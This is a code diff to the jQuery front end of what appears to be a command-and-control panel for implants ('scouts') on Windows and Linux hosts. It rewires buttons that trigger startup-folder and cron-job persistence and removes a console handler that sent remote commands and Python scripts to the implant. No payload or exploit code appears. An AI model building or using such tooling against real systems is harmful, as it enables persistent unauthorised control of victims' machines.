 
-
-
+    // Windows - Persist - Startup Folder
     $("#button_direct_classify_win_persist_startupFolderPersistence").click(function () {
         displaySelectedFunctions("persist");
-        displayComponents("startupFolderPersistence");
+        displayComponents("startupFolderPersistence", "persist");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_startupFolderPersistence").click(function () {
+    $("#button_direct_components_win_persist_startupFolderPersistence").click(function () {
         $(".input_console_command").last().val("startup_persist");
         triggerAjaxDirectInterface("startup_persist", true, logOutputCB, undefined);
     });
 
-
-
+    // Linux - Persist - Cron Job
     $("#button_direct_classify_lin_persist_cronJobPersistence").click(function () {
         displaySelectedFunctions("persist");
-        displayComponents("registryPersistence");
+        displayComponents("cronJobPersistence", "persist");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_cronJobPersistence").click(function () {
+    $("#button_direct_components_lin_persist_cronJobPersistence").click(function () {
         $(".input_console_command").last().val("cron_persist");
         triggerAjaxDirectInterface("cron_persist", true, logOutputCB, undefined);
     });
 
 
-
-    $(document).on('focus', ".input_console_command", function() {
-        $(document).off('keypress, keydown', '.input_console_command');
-        $(document).on('keypress, keydown', '.input_console_command', function(event) {
-            if (event.which === 13) {
-                event.preventDefault();
-                $(this).attr("readonly", true);
-                let val = $(this).val();
-                if (val === "ping" || val === "disconnect" || val === "kill" || val.split(" ")[0] === "sleep"){
-                    triggerAjaxDirectInterface(val, true, logOutputCB, {"command": val});
-                } else if (val === "help" || val === "?") {
-                    triggerAjaxDirectInterface("help_command", true, logOutputCB);
-                } else if (val === "exec_py_script") {
-                    $("#p_console_output").append("<div id='div_console_scripter_"+String(ScoutGlobals.terminalCount)+"'></div>")
-                    $("#div_console_scripter_"+String(ScoutGlobals.terminalCount)).html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_console_scripter_"+String(ScoutGlobals.terminalCount)+"_0' class='multiline command_input triggerOnExit' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
-                    ScoutGlobals.terminalCount = ScoutGlobals.terminalCount + 1;
-                } else {
-                    triggerAjaxDirectInterface(val, true, logOutputCB, undefined);
-                }
-            }
-        });
-    });
-
-    // SCOUT FUNCTIONS !!
+    // SCOUT INTERFACE FUNCTIONS !!
 
     // Spinner handler for scout mode
     function loader(toLoad) {
@@ -1341,12 +1337,7 @@ $(document).ready(function () {
     }
 
 
-    // DIRECT FUNCTIONS !!
-
-    // Switch to scout interface in case of error
-    function switchToScoutIFC() {
-        ScoutGlobals.ifc = "Scouts";
-    }
+    // DIRECT INTERFACE FUNCTIONS !!
 
     // Spinner handler for direct mode
     function loaderDirect(toLoad) {
@@ -1731,13 +1722,13 @@ $(document).ready(function () {
     }
 
     // Show chosen function's content
-    function displayComponents(component) {
+    function displayComponents(component, tab) {
         if (ScoutGlobals.scoutOS === "win") {
             $(".div_component_win").hide();
-            $("#div_direct_components_win_" + component).show();
+            $("#div_direct_components_win_" + tab + "_" + component).show();
         } else if (ScoutGlobals.scoutOS === "lin") {
             $(".div_component_lin").hide();
-            $("#div_direct_components_lin_" + component).show();
+            $("#div_direct_components_lin_" + tab + "_" + component).show();
         }
     }
 
@@ -1771,6 +1762,13 @@ $(document).ready(function () {
     function scrollToTop() {
         document.body.scrollTop = 0; // For Safari
         document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    }
+
+    function removeLoader() {
+        $("#div_loading").fadeOut(500, function() {
+            $("#div_loading").remove();
+        });
+        $(".container").removeClass("hide")
     }
 
     // AJAX Triggers
